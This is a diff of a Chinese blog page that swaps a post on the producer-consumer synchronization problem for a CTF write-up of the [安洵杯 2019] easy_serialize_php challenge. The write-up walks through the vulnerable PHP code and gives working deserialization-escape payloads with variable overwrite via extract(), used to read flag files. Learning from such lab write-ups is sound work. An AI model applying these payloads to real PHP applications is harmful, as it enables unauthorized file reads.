@@ -6,21 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>进程同步_临界资源的分配算法 | ohou</title>
+  <title>序列化与反序列化逃逸 | ohou</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生产者-消费者问题描述的是：一群生产者进程生产产品，并且将这些产品将提供给消费者进程消费。为了使生产者进程和消费者进程能并发执行，在两者之间设置了一个具有 n 个缓冲区的缓冲池。缓冲池就是给来平衡生产和消费进程之间的同步问题。保证不过度生成和过度消费。">
+  <meta name="description" content="[安洵杯 2019]easy_serialize_php知识点  PHP反序列化 反序列化逃逸 代码审计 变量覆盖   先构建url 1http:&#x2F;&#x2F;16c8adb4-2996-4cdb-9be5-b8071e3a3f3f.node3.buuoj.cn&#x2F;index.php?f&#x3D;phpinfo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="进程同步_临界资源的分配算法">
-<meta property="og:url" content="http://example.com/2020/10/28/%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5-%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95/index.html">
+<meta property="og:title" content="序列化与反序列化逃逸">
+<meta property="og:url" content="http://example.com/2020/11/21/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/index.html">
 <meta property="og:site_name" content="ohou">
-<meta property="og:description" content="生产者-消费者问题描述的是：一群生产者进程生产产品，并且将这些产品将提供给消费者进程消费。为了使生产者进程和消费者进程能并发执行，在两者之间设置了一个具有 n 个缓冲区的缓冲池。缓冲池就是给来平衡生产和消费进程之间的同步问题。保证不过度生成和过度消费。">
+<meta property="og:description" content="[安洵杯 2019]easy_serialize_php知识点  PHP反序列化 反序列化逃逸 代码审计 变量覆盖   先构建url 1http:&#x2F;&#x2F;16c8adb4-2996-4cdb-9be5-b8071e3a3f3f.node3.buuoj.cn&#x2F;index.php?f&#x3D;phpinfo">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-10-28T06:21:13.000Z">
-<meta property="article:modified_time" content="2020-10-28T08:01:16.852Z">
+<meta property="article:published_time" content="2020-11-21T08:57:45.000Z">
+<meta property="article:modified_time" content="2020-11-21T14:05:53.623Z">
 <meta property="article:author" content="zeng-jiahao">
-<meta property="article:tag" content="操作系统">
-<meta property="article:tag" content="进程">
-<meta property="article:tag" content="临界资源">
+<meta property="article:tag" content="ctf-wp">
+<meta property="article:tag" content="序列化逃逸">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="ohou" type="application/atom+xml">
@@ -165,44 +164,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-进程同步-临界资源的分配算法" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-序列化与反序列化逃逸" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      进程同步_临界资源的分配算法
+      序列化与反序列化逃逸
     </h1>
   
 
         
-        <a href="/2020/10/28/%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5-%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2020-10-28T06:21:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
+        <a href="/2020/11/21/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" class="archive-article-date">
+  	<time datetime="2020-11-21T08:57:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者-消费者问题"></a>生产者-消费者问题</h2><p>描述的是：<br>一群生产者进程生产产品，并且将这些产品将提供给消费者进程消费。为了使生产者进程和消费者进程能并发执行，在两者之间设置了一个具有 n 个缓冲区的缓冲池。<br>缓冲池就是给来平衡生产和消费进程之间的同步问题。保证不过度生成和过度消费。</p>
+        <h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><blockquote>
+<ol>
+<li>PHP反序列化</li>
+<li>反序列化逃逸</li>
+<li>代码审计</li>
+<li>变量覆盖</li>
+</ol>
+</blockquote>
+<p>先构建url</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://16c8adb4-2996-4cdb-9be5-b8071e3a3f3f.node3.buuoj.cn/index.php?f=phpinfo</span><br></pre></td></tr></table></figure>
+
 <a id="more"></a>
-<hr>
-<p>算法描述：利用数组buffer表示具有 n 个缓冲区的缓冲池，in表示存放产品的指针，out表示去除产品的指针。<br>存取操作时，in和out值的变化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in &#x3D; (in + 1) % n ; out &#x3D; (out + 1) % n </span><br></pre></td></tr></table></figure>
-<p>当 <code>(in + 1) % n = out</code> 时表示缓冲池满，<code>in = out</code> 表示缓冲池空。</p>
-<h5 id="生产者和消费者两进程共享下面变量"><a href="#生产者和消费者两进程共享下面变量" class="headerlink" title="生产者和消费者两进程共享下面变量"></a>生产者和消费者两进程共享下面变量</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int in &#x3D; 0, out &#x3D; 0, count &#x3D; 0;</span><br><span class="line">item buffer[n];</span><br></pre></td></tr></table></figure>
-<p>in 和 out 初始化为 0 。生产者进程使用局部变量 nextp ,用于暂时存放每次刚产出的产品；消费者使用局部变量 nextc ,用于存放每次要消费的产品。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void producer()&#123;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        produce an item nextp;</span><br><span class="line">        ···</span><br><span class="line">        while(counter &#x3D;&#x3D; n)</span><br><span class="line">        ;</span><br><span class="line">        buffer[in] &#x3D; nextp;</span><br><span class="line">        in &#x3D; (in + 1) % n;</span><br><span class="line">        counter++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void consumer()&#123;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        while(counter &#x3D;&#x3D; 0)</span><br><span class="line">        ;</span><br><span class="line">        nextc &#x3D; buffer[out];</span><br><span class="line">        out &#x3D; (out + 1) % n;</span><br><span class="line">        counter--;</span><br><span class="line">        consumer the item in nextc;</span><br><span class="line">        ···</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<h4 id="counter变量访问控制"><a href="#counter变量访问控制" class="headerlink" title="counter变量访问控制"></a>counter变量访问控制</h4><p>由上面的算法可知，如果不控制好生产者和消费者对共享变量 counter 的访问就会出现差错。<br>下面例举生成者和消费者对 counter 的加 1 和减 1 操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">register1 &#x3D; counter;            register2 &#x3D; counter;</span><br><span class="line">register1 &#x3D; register1 + 1;      register2 &#x3D; register2 - 1;</span><br><span class="line">counter &#x3D; register1;            counter &#x3D; register2;</span><br></pre></td></tr></table></figure>
+<p>发现 <code>d0g3_f1ag.php</code> </p>
+<h4 id="分析代码："><a href="#分析代码：" class="headerlink" title="分析代码："></a>分析代码：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> filter(<span class="variable">$img</span>)&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = array(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>如果生产者消费者两进程并发执行，两个程序中的各个语句交叉执行。</p>
-<p>设 counter = 5</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register1 &#x3D; counter;  </span><br><span class="line">register1 &#x3D; register1 + 1; </span><br><span class="line">register2 &#x3D; counter;</span><br><span class="line">register2 &#x3D; register2 - 1;</span><br><span class="line">counter &#x3D; register1; </span><br><span class="line">counter &#x3D; register2;</span><br></pre></td></tr></table></figure>
+<p><code>filter()</code>函数利用黑名单把 <code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code> 替换成空。这就有了 <code>逃逸</code> 的操作空间。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure>
 
-<p>执行一次生产者进程和消费者进程后应该： <code>counter = 5</code><br>但是如果是上述交叉执行。 <code>counter = 4</code><br>所以为了解决这个问题，应该把变量 counter 作为临界资源处理。即生产者进程和消费者进程互斥的访问变量 counter</p>
+<p> <code>unset</code> 函数将 <code>$_SESSION</code> 销毁了。</p>
+<p>然后重新赋予 <code>$_SESSION</code> 了新的值。</p>
+<p>最后调用了 extract($_POST); </p>
+<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
+<p>根据 extract() 我们可以进行变量覆盖，</p>
+<p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和 $SESSION[‘function’] 全部会消失。<br>只剩下_SESSION[flag]=123。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$_GET[&#39;img_path&#39;]</code> 我们利用不了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));//先序列化，然后再过滤，后赋值</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); //maybe you can find something <span class="keyword">in</span> here!</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);//反序列化</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$function = &#39;show_image&#39;</code> 的时候，就可以根据 <code>img</code> 的键值的 base64 解码后的值 来打开对应的文件。</p>
+<h4 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h4><p>利用 <code>filter()函数</code> 的过滤作用和 数据序列化后的特定格式 构建恶意键值对。</p>
+<p>参考blog：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109683884?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">https://blog.csdn.net/satasun/article/details/109683884?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
+</blockquote>
+<h4 id="实现逃逸"><a href="#实现逃逸" class="headerlink" title="实现逃逸"></a>实现逃逸</h4><p>post调用extract函数实现变量覆盖，这里有三种post方式，均可以实现逃逸，可对比学习规律</p>
+<p>首先payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="comment">#方法一</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagflag&#x27;</span>]=<span class="string">&#x27;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">#结果 a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;，这里就造成img不成为一个键，也就无法进行加密</span></span><br><span class="line">    <span class="comment">#过滤掉flag有</span></span><br><span class="line">    <span class="comment">#a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span></span><br><span class="line">    <span class="comment">#使得绕过;s:51:&quot;&quot;到达下一个封号，这时img成功逃逸出来</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment">#方法二</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagphp&#x27;</span>]=<span class="string">&#x27;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#方法三</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;flagflag&#x27;</span>]=<span class="string">&#x27;&quot;;s:2:&quot;aa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line">​</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">​</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line">​</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>继续替换掉base64值读取即可 L2QwZzNfZmxsbGxsbGFn</p>
 
       
 
@@ -247,15 +271,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">操作系统</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">ctf-wp</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">进程</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">临界资源</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">序列化逃逸</a>
         		</li>
       		
 		</ul>
@@ -311,7 +331,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/10/28/%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5-%E4%B8%B4%E7%95%8C%E8%B5%84%E6%BA%90%E7%9A%84%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/11/21/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -325,18 +345,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/11/04/2-4-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          2.4-进程同步
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/07/XSS-Lab%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XSS_Lab刷题笔记-2</div>
+    <a href="/2020/11/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">[网鼎杯 2020 青龙组]AreUSerialz</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -363,7 +374,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E4%BA%A7%E8%80%85-%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">生产者-消费者问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E4%BA%A7%E8%80%85%E5%92%8C%E6%B6%88%E8%B4%B9%E8%80%85%E4%B8%A4%E8%BF%9B%E7%A8%8B%E5%85%B1%E4%BA%AB%E4%B8%8B%E9%9D%A2%E5%8F%98%E9%87%8F"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">生产者和消费者两进程共享下面变量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#counter%E5%8F%98%E9%87%8F%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.0.1.</span> <span class="toc-text">counter变量访问控制</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php"><span class="toc-number">1.</span> <span class="toc-text">[安洵杯 2019]easy_serialize_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">分析代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-number">1.3.</span> <span class="toc-text">反序列化逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E9%80%83%E9%80%B8"><span class="toc-number">1.4.</span> <span class="toc-text">实现逃逸</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
